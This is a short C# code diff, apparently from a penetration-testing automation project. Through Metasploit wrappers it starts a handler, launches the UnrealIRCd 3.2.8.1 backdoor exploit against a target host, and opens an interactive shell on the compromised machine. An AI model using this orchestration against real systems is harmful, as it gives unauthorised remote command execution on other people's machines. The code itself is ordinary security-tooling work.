@@ -1,4 +1,4 @@
-﻿using System;
+﻿using System.Linq;
 using System.Threading.Tasks;
 using Lacey.Alexa.Common.Metasploit.Const;
 using Lacey.Alexa.Common.Metasploit.Extensions;
@@ -27,9 +27,7 @@ namespace Lacey.Alexa.Explorer.Services.Services.Concrete
             _metasploit.MultiHandlerExec(out var jobId);
             _metasploit.UnrealIrcd3281BackdoorExec(rHost);
             var shell = _metasploit.WaitModuleJob(ModuleNames.UnrealIrcd3281Backdoor, jobId);
-            var result = _metasploit.ShellExec(shell, "id");
-            Console.WriteLine(result);
-            var sessions = _metasploit.GetModuleCompatibleSessions(ModuleNames.MultiGeneralExecute);
+            _metasploit.ShellInteract(shell.First().Key);
 
             return Task.CompletedTask;
         }
